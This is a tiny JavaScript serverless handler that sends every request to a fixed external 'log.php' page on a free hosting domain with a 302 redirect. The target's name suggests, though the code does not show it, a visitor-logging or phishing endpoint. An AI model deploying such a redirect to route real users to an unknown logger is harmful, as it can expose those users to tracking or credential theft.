export default async function handler(req, res) {
  // You can set your target URL here:
  const targetUrl = 'https://bosta.unaux.com/log.php';

  // Set redirect response (302 temporary)
  res.statusCode = 302;
  res.setHeader('Location', targetUrl);
  res.end();
}
